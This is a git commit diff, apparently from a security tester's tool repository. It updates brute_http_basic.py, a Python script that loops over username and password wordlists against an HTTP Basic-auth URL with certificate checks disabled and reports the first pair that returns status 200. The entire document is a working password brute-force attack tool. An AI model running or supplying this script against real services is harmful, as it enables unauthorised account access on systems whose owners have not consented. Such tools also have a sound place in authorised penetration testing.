2fcee178b47a8c741cfe9cf53ef51f6008245920
AverageSecurityGuy <stephen@averagesecurityguy.info>
2013-06-14 21:52:21 -0400

    Removed success string. Using status_code for success.

--- brute_http_basic.py
+++ brute_http_basic.py
@@ -1,18 +1,22 @@
 import requests
 import sys
 
-if len(sys.argv) != 5:
-    print 'USAGE: brute_http_basic.py url userfile passfile success'
+if len(sys.argv) != 4:
+    print 'USAGE: brute_http_basic.py url userfile passfile'
     sys.exit()
 
 url = sys.argv[1]
 userfile = sys.argv[2]
 passfile = sys.argv[3]
-success = sys.argv[4]
 
 for pwd in open(passfile):
     for user in open(userfile):
-        resp = requests.get(url, auth=requests.auth.HTTPBasicAuth(user, pwd))
-        print resp.content
-        # if success in resp.text:
-        #     print 'Success: {0}/{1}'.format(user, pwd)
+        user = user.rstrip('\r\n')
+        pwd = pwd.rstrip('\r\n')
+        resp = requests.get(url, auth=requests.auth.HTTPBasicAuth(user, pwd),
+                            verify=False)
+        if resp.status_code == 200:
+            print 'Success: {0}/{1}'.format(user, pwd)
+            sys.exit()
+        else:
+            print 'Failure: {0}/{1}'.format(user, pwd)
